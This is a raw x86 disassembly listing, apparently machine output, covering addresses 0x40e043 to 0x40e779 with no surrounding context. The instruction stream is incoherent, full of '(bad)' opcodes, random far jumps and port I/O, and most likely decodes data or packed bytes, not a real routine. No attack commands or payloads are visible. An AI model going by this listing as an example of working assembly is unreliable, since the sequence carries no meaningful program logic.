  40e043:	(bad)  
  40e044:	daa    
  40e045:	push   esp
  40e046:	outs   dx,DWORD PTR ds:[esi]
  40e047:	repz adc DWORD PTR [ecx-0x6903528e],eax
  40e04e:	sar    BYTE PTR [eax],cl
  40e050:	scas   eax,DWORD PTR es:[edi]
  40e051:	not    DWORD PTR [ebx+0x53]
  40e054:	add    ebx,edi
  40e056:	int3   
  40e057:	in     al,dx
  40e058:	cmc    
  40e059:	mov    cl,0x23
  40e05b:	fsubr  st,st(1)
  40e05d:	or     ebp,ebp
  40e05f:	mov    al,ds:0x56223346
  40e064:	push   ebp
  40e065:	add    al,0xee
  40e067:	jmp    0xb7f5:0x7e8482b5
  40e06e:	sar    DWORD PTR [edi-0x7c],cl
  40e071:	adc    al,0x13
  40e073:	and    ah,0x38
  40e076:	ss lahf 
  40e078:	ror    BYTE PTR [ebx],1
  40e07a:	xor    al,0x99
  40e07d:	rol    DWORD PTR [ebp+0x6edf3f0f],cl
  40e083:	xchg   edi,eax
  40e084:	mov    bh,BYTE PTR [edx+0x385a405d]
  40e08a:	jmp    0xf7436422
  40e08f:	add    eax,0xd175d73c
  40e094:	pusha  
  40e095:	cwde   
  40e096:	stc    
  40e097:	out    0x85,eax
  40e099:	mov    al,0xba
  40e09b:	push   ebx
  40e09c:	add    BYTE PTR [eax],bh
  40e09e:	mov    BYTE PTR [ebx+0x30],ah
  40e0a1:	ficom  WORD PTR [esi]
  40e0a3:	(bad)  
  40e0a4:	or     edx,ebp
  40e0a6:	push   0xfffffff9
  40e0a8:	mov    esp,0xb58fedfc
  40e0ad:	sub    eax,ebp
  40e0af:	aaa    
  40e0b0:	fwait
  40e0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0b2:	sub    DWORD PTR [ecx],edi
  40e0b4:	sahf   
  40e0b5:	mov    BYTE PTR [ebp+0x5b],0x3c
  40e0b9:	adc    ah,dh
  40e0bb:	dec    ebx
  40e0bc:	inc    edi
  40e0bd:	pop    esi
  40e0be:	outs   dx,DWORD PTR ds:[esi]
  40e0bf:	nop
  40e0c0:	sbb    DWORD PTR ds:[edi+0x46],ecx
  40e0c4:	test   eax,0x8b393119
  40e0c9:	sub    DWORD PTR [eax],eax
  40e0cb:	jmp    0xf2f5:0x63936154
  40e0d2:	popf   
  40e0d3:	pop    ds
  40e0d4:	mov    ch,0x3f
  40e0d6:	xor    eax,edx
  40e0d8:	add    bh,BYTE PTR [eax]
  40e0da:	dec    esp
  40e0db:	sub    al,0x9e
  40e0dd:	jmp    0x40e125
  40e0df:	js     0x40e085
  40e0e1:	jecxz  0x40e13f
  40e0e3:	in     al,dx
  40e0e4:	cmc    
  40e0e5:	sti    
  40e0e6:	and    WORD PTR [ecx+0x70d454e7],dx
  40e0ed:	cmp    BYTE PTR [edi-0x4c],dh
  40e0f0:	fadd   DWORD PTR [ebp-0x47b58716]
  40e0f6:	jge    0x40e094
  40e0f8:	(bad)  
  40e0f9:	dec    ecx
  40e0fa:	sbb    al,0xd9
  40e0fc:	sbb    al,0x19
  40e0fe:	mov    ebx,0x1de456d8
  40e103:	pcmpeqw mm7,QWORD PTR [edx+eiz*2]
  40e107:	push   eax
  40e108:	inc    ecx
  40e109:	mov    ds:0xb132e2fd,al
  40e10e:	ret    
  40e10f:	mov    eax,0xd230984d
  40e114:	pop    edx
  40e115:	call   0x3636:0x6063882
  40e11c:	xchg   ecx,eax
  40e11d:	(bad)  
  40e11e:	stos   BYTE PTR es:[edi],al
  40e11f:	push   ecx
  40e120:	ds adc bh,0xb8
  40e124:	pop    ds
  40e125:	mov    al,ds:0x16c7ccb0
  40e12a:	fdivr  QWORD PTR [eax]
  40e12c:	(bad)
  40e12f:	mov    ebp,0x897e3361
  40e134:	cmc    
  40e135:	leave  
  40e136:	lock rcr DWORD PTR [ecx+edx*4+0x3bc6562c],1
  40e13e:	mov    bh,0x72
  40e140:	stos   BYTE PTR es:[edi],al
  40e141:	(bad)  
  40e143:	jo     0x40e13b
  40e145:	sub    DWORD PTR [ebx+0x6ea5fcf5],eax
  40e14b:	push   es
  40e14c:	daa    
  40e14d:	push   ebp
  40e14e:	lds    ebx,FWORD PTR [edi-0x2cffc45a]
  40e154:	xor    esi,DWORD PTR [ebx-0x1e]
  40e157:	repz and eax,0xfdf76eb5
  40e15d:	sar    DWORD PTR [ebx-0x1c3f660b],cl
  40e163:	cmp    BYTE PTR [ebx+0x2f766647],al
  40e169:	jl     0x40e1b6
  40e16b:	out    dx,eax
  40e16c:	cmc    
  40e16d:	aad    0x3e
  40e16f:	add    ecx,DWORD PTR [edi]
  40e171:	outs   dx,BYTE PTR ds:[esi]
  40e172:	push   0xffffff8c
  40e174:	pop    edx
  40e175:	ss or  eax,0x4bc2a8f6
  40e17b:	test   eax,0x21d17da0
  40e180:	jne    0x40e1ea
  40e182:	popa   
  40e183:	inc    ecx
  40e184:	adc    ah,ah
  40e186:	outs   dx,BYTE PTR ds:[esi]
  40e187:	test   eax,0x17dce48d
  40e18c:	push   ebx
  40e18d:	aad    0x39
  40e18f:	lds    esi,FWORD PTR [eax-0x54]
  40e192:	adc    eax,0x36a91a39
  40e197:	sub    esp,ebp
  40e199:	inc    edx
  40e19a:	fidiv  DWORD PTR [esp+ebp*8+0x1cb40a58]
  40e1a1:	arpl   di,cx
  40e1a3:	xchg   edx,eax
  40e1a4:	push   ecx
  40e1a5:	nop
  40e1a6:	push   ebx
  40e1a7:	cmp    esi,esp
  40e1a9:	aad    0xd8
  40e1ab:	test   eax,0x73bf1e41
  40e1b0:	cmc    
  40e1b1:	sbb    bh,BYTE PTR [ecx+0x64f6a593]
  40e1b7:	in     eax,0xdc
  40e1b9:	cmp    ebp,DWORD PTR [ebx+0x2cc4d35b]
  40e1bf:	and    BYTE PTR [edx],dl
  40e1c1:	cdq    
  40e1c2:	fist   WORD PTR [edx]
  40e1c4:	cmc    
  40e1c5:	cmp    DWORD PTR [ecx-0x48],ebp
  40e1c8:	pop    edi
  40e1c9:	xor    eax,esp
  40e1cb:	in     eax,dx
  40e1cc:	mov    ecx,0x6257a73b
  40e1d1:	push   0x7
  40e1d3:	mov    esi,0xc16ead25
  40e1d8:	sahf   
  40e1d9:	cs xchg ecx,eax
  40e1db:	inc    esi
  40e1dc:	jmp    0x40e24d
  40e1de:	inc    edi
  40e1df:	cmp    edx,esi
  40e1e1:	or     esi,DWORD PTR ds:0x14f475b0
  40e1e7:	sbb    BYTE PTR [esi+0x13],bh
  40e1ea:	in     al,dx
  40e1eb:	xor    ebp,0xc40cbc0d
  40e1f1:	xchg   esi,eax
  40e1f2:	loopne 0x40e272
  40e1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f5:	pop    es
  40e1f6:	add    al,0x4b
  40e1f8:	mov    eax,ds:0x24d8ea3b
  40e1fd:	fcmovnbe st,st(2)
  40e1ff:	outs   dx,DWORD PTR ds:[esi]
  40e200:	adc    dl,BYTE PTR [esi+0x6ba8a069]
  40e206:	jg     0x40e1bd
  40e208:	or     eax,DWORD PTR [eax+0x3bafa6ff]
  40e20e:	outs   dx,DWORD PTR ds:[esi]
  40e20f:	ins    BYTE PTR es:[edi],dx
  40e210:	pop    ss
  40e211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e212:	sar    ecx,0xb8
  40e215:	inc    edi
  40e216:	outs   dx,DWORD PTR ds:[esi]
  40e217:	retf   
  40e218:	xchg   ebp,eax
  40e219:	in     eax,dx
  40e21a:	repz cmp al,0x6
  40e21d:	lods   al,BYTE PTR ds:[esi]
  40e21e:	and    al,0x2b
  40e220:	inc    ebp
  40e221:	inc    ebp
  40e222:	cmp    BYTE PTR [ebp+edx*8-0x4ae56853],dh
  40e229:	clc    
  40e22a:	pop    eax
  40e22b:	or     ebx,DWORD PTR [ebx]
  40e22d:	jb     0x40e23d
  40e22f:	scas   al,BYTE PTR es:[edi]
  40e230:	cmc    
  40e231:	loop   0x40e25d
  40e233:	adc    BYTE PTR [edx],cl
  40e235:	mov    DWORD PTR [ecx+0x332d0238],esp
  40e23b:	daa    
  40e23c:	adc    al,0x8
  40e23e:	mov    bl,0x55
  40e240:	cmc    
  40e241:	rol    DWORD PTR [eax-0x4d],cl
  40e244:	imul   eax,eax,0x3809038c
  40e24a:	mov    ds:0xc05da616,eax
  40e24f:	add    BYTE PTR [ecx-0x38705859],dh
  40e255:	cmp    eax,DWORD PTR [eax-0x3a9f4243]
  40e25b:	jno    0x40e28f
  40e25d:	cmp    BYTE PTR [ebx-0x6d],ah
  40e260:	adc    BYTE PTR [ebx],bh
  40e262:	dec    ebp
  40e263:	jne    0x40e281
  40e265:	shr    DWORD PTR [esi+0x35],1
  40e268:	shl    BYTE PTR [ebx],0x8f
  40e26b:	or     bh,BYTE PTR [ebp+0x2c08c28c]
  40e271:	push   edi
  40e272:	mov    ecx,esi
  40e274:	jg     0x40e259
  40e276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e277:	inc    di
  40e279:	cmp    BYTE PTR [ebp-0x2dcc24f7],cl
  40e27f:	in     al,dx
  40e280:	cmp    DWORD PTR [ecx+0x6db13e0f],edi
  40e286:	in     al,0xd7
  40e288:	popa   
  40e289:	out    0x12,al
  40e28b:	or     DWORD PTR [esi-0x1acb730e],ebx
  40e291:	fdiv   QWORD PTR [ebp-0x80]
  40e294:	xchg   ebx,eax
  40e295:	mov    esi,0x15a7052e
  40e29a:	cmp    BYTE PTR [eax],0xec
  40e29d:	push   cx
  40e29f:	jmp    0x40e27f
  40e2a1:	neg    cl
  40e2a3:	cld    
  40e2a4:	cmc    
  40e2a5:	xlat   BYTE PTR gs:[ebx]
  40e2a7:	push   ebp
  40e2a8:	xor    BYTE PTR [ebx],ch
  40e2aa:	aad    0x24
  40e2ac:	push   ecx
  40e2ad:	cmp    BYTE PTR ds:0x4cea77ad,al
  40e2b3:	jns    0x40e23a
  40e2b5:	and    eax,0x416e286f
  40e2ba:	lds    edx,FWORD PTR [edx*8+0x24389eda]
  40e2c1:	pop    ds
  40e2c2:	out    dx,eax
  40e2c3:	push   es
  40e2c4:	(bad)  [edi+ebx*2]
  40e2c7:	inc    ebx
  40e2c8:	cmc    
  40e2c9:	and    al,0x55
  40e2cb:	out    dx,eax
  40e2cc:	xchg   edx,eax
  40e2cd:	xor    cl,dl
  40e2cf:	dec    esp
  40e2d0:	mov    bl,BYTE PTR [edi]
  40e2d2:	mov    ds:0xd3382622,al
  40e2d7:	xor    cl,BYTE PTR [esi]
  40e2d9:	test   BYTE PTR [eax+0x7264f543],bl
  40e2df:	and    BYTE PTR [ecx],0x9a
  40e2e2:	xor    BYTE PTR [ebx+0x2e2c386e],bl
  40e2e8:	pop    ebp
  40e2e9:	add    esp,ebp
  40e2eb:	add    eax,DWORD PTR [edi-0x54b35d2e]
  40e2f1:	and    esp,DWORD PTR [edx-0xbc7db00]
  40e2f7:	adc    eax,0x28c1e6cc
  40e2fc:	int    0xe2
  40e2fe:	bound  esi,QWORD PTR [eax+0x3d]
  40e301:	sub    ebp,edi
  40e303:	xlat   BYTE PTR ds:[ebx]
  40e304:	sbb    DWORD PTR [edi],edi
  40e306:	mov    ch,0xfa
  40e308:	add    al,BYTE PTR [esi+ebp*2]
  40e30b:	xchg   esp,eax
  40e30c:	and    BYTE PTR [edx+0x59],dl
  40e30f:	outs   dx,BYTE PTR ds:[esi]
  40e310:	xchg   edi,eax
  40e311:	sbb    dl,dh
  40e313:	dec    eax
  40e314:	push   0x38
  40e316:	fwait
  40e317:	xchg   DWORD PTR [ebp-0x473e4fe2],esi
  40e31d:	mov    edx,0xb637bb6e
  40e322:	call   0x6ff4d790
  40e327:	and    eax,0xb8fbf9ee
  40e32c:	add    BYTE PTR [ebp-0x76],0xd1
  40e330:	fldcw  WORD PTR [bp-0x3f]
  40e334:	mov    edi,0xbdfd1b0d
  40e339:	xchg   esp,eax
  40e33a:	sub    DWORD PTR [edx-0x37451fb5],edi
  40e340:	into   
  40e341:	jmp    0x40e301
  40e343:	push   esp
  40e344:	sti    
  40e345:	mov    WORD PTR [esi-0x13],gs
  40e348:	mov    ds:0x8cbe941f,al
  40e34d:	xor    ecx,0x65b6ef39
  40e353:	mov    edx,0x54267bff
  40e358:	int    0x52
  40e35a:	push   ebp
  40e35b:	sbb    ch,dh
  40e35d:	nop
  40e35e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e35f:	out    dx,al
  40e360:	xor    BYTE PTR [edi+0x382fc3fc],ch
  40e366:	dec    eax
  40e367:	imul   eax,ecx,0x528e627f
  40e36d:	jecxz  0x40e2fb
  40e36f:	cli    
  40e370:	shl    DWORD PTR [esi+0xef5448d],1
  40e376:	mov    dl,0x2a
  40e379:	maxps  xmm7,XMMWORD PTR [ecx]
  40e37c:	(bad)  
  40e37d:	outs   dx,DWORD PTR ds:[esi]
  40e37e:	loopne 0x40e3db
  40e380:	les    edx,FWORD PTR es:[edx-0x25]
  40e384:	cmc    
  40e385:	and    al,0x68
  40e387:	mov    ah,0x76
  40e389:	cwde   
  40e38a:	test   al,0xdb
  40e38c:	lds    eax,FWORD PTR [edi]
  40e38e:	aad    0x7f
  40e390:	addr16 js 0x40e3d5
  40e393:	into   
  40e394:	lea    esp,[edi-0x13]
  40e397:	mov    bl,0xf5
  40e399:	push   ecx
  40e39a:	imul   ecx,DWORD PTR [edi+0x59],0x386f8f40
  40e3a1:	or     DWORD PTR [edx+esi*1+0x450edfc4],edx
  40e3a8:	inc    ebp
  40e3a9:	pop    edx
  40e3aa:	xchg   bl,cl
  40e3ac:	cmc    
  40e3ad:	std    
  40e3ae:	inc    ebx
  40e3af:	shl    edi,cl
  40e3b1:	mov    edx,0x3bd0e866
  40e3b6:	add    BYTE PTR [esi],ch
  40e3b8:	adc    dl,BYTE PTR [ecx+ebp*1]
  40e3bb:	jne    0x40e372
  40e3bd:	retf   
  40e3be:	imul   ebx,DWORD PTR [eax-0x7f],0x2c0fa112
  40e3c5:	pop    ebp
  40e3c6:	sub    al,0x4e
  40e3c8:	lods   eax,DWORD PTR ds:[esi]
  40e3c9:	scas   al,BYTE PTR es:[edi]
  40e3ca:	push   esi
  40e3cb:	call   FWORD PTR [eax]
  40e3cd:	cmp    BYTE PTR [eax-0x2c3529fc],al
  40e3d3:	aas    
  40e3d4:	and    BYTE PTR [ecx+eiz*8+0x7b5ce3cf],0xb1
  40e3dc:	xchg   ebx,ebx
  40e3de:	test   eax,0x89dff1a1
  40e3e3:	or     bh,cl
  40e3e5:	fcom   st(4)
  40e3e7:	cmp    BYTE PTR [esi],bh
  40e3e9:	push   esi
  40e3ea:	push   ebx
  40e3eb:	cwde   
  40e3ec:	mov    bh,0xf8
  40e3ee:	lea    ebp,[edx-0x6a]
  40e3f1:	mov    esp,0xe6f84bee
  40e3f6:	push   esi
  40e3f7:	rol    BYTE PTR [ecx],0x38
  40e3fa:	arpl   WORD PTR [ecx-0x4dd00dac],bx
  40e400:	mov    bl,0x98
  40e402:	outs   dx,BYTE PTR ds:[esi]
  40e403:	jmp    0x3596:0x3e9d118d
  40e40a:	fdivr  DWORD PTR [ecx]
  40e40c:	mov    ds:0xdd2b5228,al
  40e411:	popa   
  40e412:	push   edi
  40e413:	jo     0x40e3b2
  40e415:	mov    es,WORD PTR [esp+edx*1-0xb]
  40e419:	fxch   st(6)
  40e41b:	pop    esp
  40e41c:	pop    edi
  40e41e:	lock sub dl,cl
  40e421:	cmp    ebx,DWORD PTR [eax+0x45]
  40e424:	adc    DWORD PTR [eax],esi
  40e426:	loop   0x40e47f
  40e428:	mov    bl,0xd1
  40e42a:	mov    WORD PTR [ebx-0x15ba01b0],fs
  40e430:	cmc    
  40e431:	add    ch,BYTE PTR [ebp+0x57a8ab5b]
  40e437:	ds addr16 mov edi,0xfebd57da
  40e43e:	add    ebx,ecx
  40e440:	outs   dx,DWORD PTR ds:[esi]
  40e441:	mov    eax,ds:0x6966e16e
  40e446:	scas   al,BYTE PTR es:[edi]
  40e447:	cdq    
  40e448:	add    BYTE PTR [ebx],al
  40e44a:	pop    ss
  40e44b:	cmp    DWORD PTR [esi+0x2f],edi
  40e44e:	dec    ebp
  40e44f:	mov    eax,ds:0x207da39c
  40e454:	adc    ecx,DWORD PTR [ebp+0x7f]
  40e457:	sub    eax,0xfb84a1b5
  40e45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e45d:	in     al,dx
  40e45e:	xchg   ebx,eax
  40e45f:	mov    BYTE PTR [ecx+0x3d],dh
  40e462:	scas   al,BYTE PTR es:[edi]
  40e463:	mov    edx,0x47497dc2
  40e468:	jne    0x40e49a
  40e46a:	mov    edx,0x2594f598
  40e46f:	fmul   DWORD PTR [edx-0x4b]
  40e472:	and    dl,BYTE PTR [edx+0x6c7e3826]
  40e478:	push   cs
  40e479:	jno    0x40e4e5
  40e47b:	fdivr  QWORD PTR [ebx+eax*1+0x6e]
  40e47f:	inc    ebp
  40e480:	lods   eax,DWORD PTR ds:[esi]
  40e481:	jbe    0x40e4f5
  40e483:	dec    edx
  40e484:	jne    0x40e47d
  40e486:	stos   BYTE PTR es:[edi],al
  40e487:	adc    BYTE PTR [esi+0x38],0x93
  40e48b:	mov    ch,0xb1
  40e48d:	xchg   ebx,eax
  40e48e:	pusha  
  40e48f:	imul   esi,DWORD PTR [ebx-0x2a69086],0x6b
  40e496:	adc    al,0xc8
  40e498:	mov    ebx,0x57453be2
  40e49d:	ss cmc 
  40e49f:	mov    ss,WORD PTR [esi+0x4c]
  40e4a2:	das    
  40e4a3:	test   BYTE PTR [edx+ebx*1],0x37
  40e4a7:	pop    edi
  40e4a8:	in     al,dx
  40e4a9:	push   ss
  40e4aa:	aas    
  40e4ab:	xor    dh,BYTE PTR [ebx]
  40e4ad:	or     BYTE PTR gs:[esp+eax*8+0x74],ah
  40e4b2:	stos   BYTE PTR es:[edi],al
  40e4b3:	cmp    al,BYTE PTR [ebp+0x40]
  40e4b6:	sub    BYTE PTR [ebp+0x79],0xe0
  40e4ba:	js     0x40e519
  40e4bc:	jne    0x40e518
  40e4be:	mov    dh,0x5a
  40e4c0:	cli    
  40e4c1:	test   al,0xe4
  40e4c3:	mov    esi,0xc3b1705d
  40e4c8:	cmc    
  40e4c9:	push   ss
  40e4ca:	mov    ax,ds:0x35d7f608
  40e4d0:	mov    esi,0x72d4643b
  40e4d5:	add    DWORD PTR [eax+ebp*2],eax
  40e4d8:	loope  0x40e529
  40e4da:	outs   dx,DWORD PTR ds:[esi]
  40e4db:	cmp    edi,DWORD PTR [ebx]
  40e4dd:	jg     0x40e521
  40e4df:	or     cl,BYTE PTR [edx+0x35]
  40e4e2:	or     al,0x39
  40e4e4:	sbb    BYTE PTR [ebx+0x2b0fc326],bl
  40e4ea:	fucomip st,st(7)
  40e4ec:	jno    0x40e4b1
  40e4ee:	outs   dx,BYTE PTR ds:[esi]
  40e4ef:	mov    cl,BYTE PTR [ebp+0x6b6db2da]
  40e4f5:	and    ebx,DWORD PTR [esi]
  40e4f7:	cmp    DWORD PTR [ebx],esi
  40e4f9:	add    al,BYTE PTR [eax+0x4c]
  40e4fc:	adc    dl,BYTE PTR [edx+0x67]
  40e4ff:	adc    ebp,edx
  40e501:	inc    eax
  40e502:	mov    eax,ds:0xef7f6819
  40e507:	xchg   ebp,eax
  40e508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e509:	dec    esi
  40e50a:	sar    BYTE PTR [eax],0xe6
  40e50d:	sub    ebx,DWORD PTR ds:0x4cbac1f9
  40e513:	std    
  40e514:	inc    edi
  40e515:	neg    BYTE PTR [esi+0x79]
  40e518:	cmc    
  40e519:	push   eax
  40e51a:	add    DWORD PTR [edi+0x43f478ad],0xaf273b9b
  40e524:	add    al,0xa4
  40e526:	(bad)  
  40e528:	imul   ecx,DWORD PTR [ebx],0xb29d8b4a
  40e52e:	xchg   esi,eax
  40e52f:	loop   0x40e4f7
  40e531:	popa   
  40e532:	push   0x12ef0bc2
  40e537:	psubusb mm6,QWORD PTR [edx+eax*2]
  40e53b:	mov    ebx,0xdcda386f
  40e540:	(bad)  
  40e541:	inc    ebp
  40e542:	and    eax,0x6cf8748b
  40e547:	dec    esi
  40e548:	cmc    
  40e549:	fwait
  40e54a:	stos   DWORD PTR es:[edi],eax
  40e54b:	sub    DWORD PTR gs:[esi],esp
  40e54e:	xlat   BYTE PTR ds:[ebx]
  40e54f:	int    0x5
  40e551:	cmp    dh,BYTE PTR [ecx+0x39]
  40e554:	adc    BYTE PTR [ebx-0x554a5f7b],al
  40e55a:	mov    esi,0xd52df518
  40e55f:	inc    ecx
  40e560:	les    ebp,FWORD PTR [ecx+0x3b8a060c]
  40e566:	cmc    
  40e567:	fmul   st,st(5)
  40e569:	leave  
  40e56a:	jge    0x40e50c
  40e56c:	push   es
  40e56d:	inc    eax
  40e56e:	outs   dx,DWORD PTR ds:[esi]
  40e56f:	jbe    0x40e5a7
  40e571:	call   0x3916:0x353dbadf
  40e578:	aas    
  40e579:	mov    esp,0xd33ad9a
  40e57e:	pop    esp
  40e57f:	ret    
  40e580:	cmc    
  40e581:	jp     0x40e5d5
  40e583:	bound  ebp,QWORD PTR [eax+ebx*8-0x5c6d4597]
  40e58a:	retf   
  40e58b:	cmp    BYTE PTR [ecx-0x44],dl
  40e58e:	inc    edx
  40e58f:	inc    esi
  40e590:	stos   DWORD PTR es:[edi],eax
  40e591:	iret   
  40e592:	mov    dl,0xac
  40e594:	cmc    
  40e595:	call   DWORD PTR [eax]
  40e597:	xor    al,0x8e
  40e599:	sub    DWORD PTR [esi+0x6c],eax
  40e59c:	sti    
  40e59d:	or     DWORD PTR [ebp+0x2e8441ca],ebx
  40e5a3:	cs adc eax,0xe38648db
  40e5a9:	stos   BYTE PTR es:[edi],al
  40e5aa:	push   0x14580eed
  40e5af:	in     eax,dx
  40e5b0:	repnz cli 
  40e5b2:	jns    0x40e5de
  40e5b4:	sbb    esi,DWORD PTR [eax-0x7cf343ff]
  40e5ba:	out    0xf8,eax
  40e5bc:	xchg   esi,eax
  40e5bd:	pop    ds
  40e5be:	das    
  40e5bf:	xor    dh,ch
  40e5c1:	dec    esi
  40e5c2:	pop    ds
  40e5c3:	jbe    0x40e547
  40e5c5:	push   0xf8b57afa
  40e5ca:	call   0x89ec:0xb3ae7548
  40e5d1:	dec    DWORD PTR [ecx]
  40e5d3:	add    al,0xf5
  40e5d5:	cli    
  40e5d6:	add    BYTE PTR [ecx],ah
  40e5d8:	stc    
  40e5d9:	sub    al,0x51
  40e5db:	fstp   QWORD PTR [ecx]
  40e5dd:	cmp    BYTE PTR [edx-0x1d6b7a9a],al
  40e5e3:	daa    
  40e5e4:	outs   dx,DWORD PTR ds:[esi]
  40e5e5:	pop    ss
  40e5e6:	outs   dx,BYTE PTR ds:[esi]
  40e5e7:	push   0xffffffd7
  40e5e9:	mov    eax,0x96c537f4
  40e5ee:	in     al,0x38
  40e5f0:	test   al,0xfb
  40e5f2:	push   ecx
  40e5f3:	push   ecx
  40e5f4:	lock or al,0xdd
  40e5f7:	add    eax,0x85f003f5
  40e5fc:	or     DWORD PTR [ebx+eax*8+0x13],ecx
  40e600:	stos   DWORD PTR es:[edi],eax
  40e601:	cmp    eax,ecx
  40e603:	shl    DWORD PTR [ecx],1
  40e605:	cmova  ebp,esp
  40e608:	es xchg ebx,eax
  40e60a:	outs   dx,BYTE PTR ds:[esi]
  40e60b:	mov    ebx,0xf4dcba2
  40e610:	ins    BYTE PTR es:[edi],dx
  40e611:	dec    ecx
  40e612:	std    
  40e613:	push   es
  40e614:	jge    0x40e695
  40e616:	out    dx,eax
  40e617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e618:	mov    ebx,0x875fbc2b
  40e61d:	and    BYTE PTR [edi-0x6e],ch
  40e620:	and    ebx,DWORD PTR [ebx+0x2ca2e81c]
  40e626:	mov    bh,0x38
  40e628:	push   ebp
  40e629:	scas   al,BYTE PTR es:[edi]
  40e62a:	dec    esi
  40e62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e62c:	rcl    ebp,0x71
  40e62f:	fidivr DWORD PTR [esi]
  40e631:	outs   dx,DWORD PTR ds:[esi]
  40e632:	out    dx,eax
  40e633:	mov    eax,0x7611ac21
  40e638:	stos   DWORD PTR es:[edi],eax
  40e639:	(bad)  
  40e63a:	pop    esi
  40e63b:	ds sub bh,dh
  40e63e:	jns    0x40e624
  40e640:	mov    bl,BYTE PTR [ecx-0x52]
  40e643:	push   eax
  40e644:	imul   esp,DWORD PTR [edi+0x54bcbc6e],0xffffffe6
  40e64b:	sbb    DWORD PTR [eax+0x6b],0x30a03ec0
  40e652:	imul   eax,DWORD PTR [edx+edi*2-0x2afcb5a0],0xf51632aa
  40e65d:	inc    edi
  40e65e:	push   cs
  40e65f:	loopne 0x40e682
  40e661:	out    dx,eax
  40e662:	push   0xffffffd9
  40e664:	les    eax,FWORD PTR [eax]
  40e666:	xor    al,0x20
  40e668:	ins    BYTE PTR es:[edi],dx
  40e669:	cmp    ch,dl
  40e66b:	sbb    edi,DWORD PTR [ebx+0x36]
  40e66e:	xlat   BYTE PTR ds:[ebx]
  40e66f:	out    dx,al
  40e670:	lds    eax,FWORD PTR ds:0x96389c69
  40e676:	or     ebp,DWORD PTR [esi]
  40e678:	or     BYTE PTR [eax+0x3ba2c88e],dl
  40e67e:	sub    BYTE PTR [esi+0x36],dh
  40e681:	xchg   BYTE PTR [ecx],bl
  40e683:	call   0x97e46513
  40e688:	mov    bl,0xbb
  40e68a:	jbe    0x40e646
  40e68c:	iret   
  40e68d:	pop    eax
  40e68e:	int3   
  40e68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e690:	ins    DWORD PTR es:[edi],dx
  40e691:	cmp    BYTE PTR [edx-0x6e],cl
  40e694:	jbe    0x40e6c0
  40e696:	das    
  40e697:	add    ah,cl
  40e699:	xlat   BYTE PTR ds:[ebx]
  40e69a:	outs   dx,BYTE PTR ds:[esi]
  40e69b:	push   0xffffffd5
  40e69d:	fcom   st(0)
  40e69f:	inc    edi
  40e6a0:	add    edi,DWORD PTR [ecx]
  40e6a2:	(bad)  
  40e6a3:	and    al,0xaf
  40e6a5:	stc    
  40e6a6:	push   0xc43cec85
  40e6ab:	fidivr WORD PTR ds:0xee804338
  40e6b1:	ret    0xf9a1
  40e6b4:	xchg   edx,eax
  40e6b5:	or     ecx,edx
  40e6b7:	jbe    0x40e72d
  40e6b9:	sbb    BYTE PTR [ecx+edx*1+0x47],al
  40e6bd:	pushf  
  40e6be:	push   0xa6d41338
  40e6c3:	xor    al,0x1e
  40e6c5:	pop    ss
  40e6c6:	out    dx,eax
  40e6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c8:	cmc    
  40e6c9:	arpl   ax,ax
  40e6cb:	pop    esi
  40e6cc:	test   BYTE PTR [eax+0x38463a04],ah
  40e6d2:	shl    DWORD PTR [ebp+edx*1-0x6a],cl
  40e6d6:	shr    DWORD PTR [ecx+eiz*1+0x7a],0xe2
  40e6db:	xchg   esi,eax
  40e6dc:	in     al,dx
  40e6dd:	icebp  
  40e6de:	cs cmp al,0xe8
  40e6e2:	mov    ?,WORD PTR [esi+ebx*1-0x6b]
  40e6e6:	or     BYTE PTR [esp+ebx*1],bh
  40e6e9:	ror    BYTE PTR [ecx+0x3c],0x62
  40e6ed:	sahf   
  40e6ee:	pop    esi
  40e6ef:	ror    DWORD PTR [edi],cl
  40e6f1:	mov    ch,BYTE PTR [esi+0x41]
  40e6f4:	mov    BYTE PTR [ecx],bh
  40e6f6:	sub    ecx,ebp
  40e6f8:	push   edx
  40e6f9:	sti    
  40e6fa:	sub    eax,0x548fc939
  40e6ff:	pop    es
  40e700:	xchg   DWORD PTR [ecx],ecx
  40e702:	sbb    esi,ecx
  40e704:	adc    al,0x44
  40e706:	mov    eax,0x159bf6e1
  40e70b:	aad    0x81
  40e70d:	ss sahf 
  40e70f:	push   ebx
  40e710:	add    eax,0x121cdf38
  40e715:	xchg   edx,eax
  40e716:	and    DWORD PTR [ebp-0x48],eax
  40e719:	jns    0x40e770
  40e71b:	jmp    0xc2c8b615
  40e720:	ret    0x4886
  40e723:	sahf   
  40e724:	daa    
  40e725:	cmp    eax,DWORD PTR [eax-0x67a09302]
  40e72b:	ss js  0x40e75a
  40e72e:	(bad)  
  40e730:	cmc    
  40e731:	addr16 inc esp
  40e733:	lods   eax,DWORD PTR ds:[esi]
  40e734:	push   ecx
  40e735:	aam    0x58
  40e737:	int    0xe6
  40e739:	cmp    BYTE PTR [edx+0x6c],ch
  40e73c:	std    
  40e73d:	add    al,0x40
  40e73f:	jns    0x40e6ee
  40e741:	imul   DWORD PTR [esi+0x24]
  40e744:	into   
  40e745:	pop    di
  40e747:	outs   dx,BYTE PTR ds:[esi]
  40e748:	and    esi,DWORD PTR [edx]
  40e74a:	mov    ebx,0xaa222238
  40e74f:	outs   dx,DWORD PTR ds:[esi]
  40e750:	mov    BYTE PTR [esi],0xe
  40e753:	sti    
  40e754:	jno    0x40e769
  40e756:	dec    edx
  40e757:	lock adc DWORD PTR [esi],ebp
  40e75a:	sub    al,0xae
  40e75c:	mov    ch,0xf1
  40e75e:	or     ebx,ecx
  40e760:	mov    cl,0xb4
  40e762:	mov    esi,0x94937d38
  40e767:	ins    DWORD PTR es:[edi],dx
  40e768:	jg     0x40e7a4
  40e76a:	shr    esp,cl
  40e76c:	jecxz  0x40e7e8
  40e76e:	loopne 0x40e78f
  40e770:	test   eax,0xb8f6ebfb
  40e775:	test   al,al
  40e777:	int    0xad
  40e779:	cmp    eax,DWORD PTR [edi-0x6c288050]
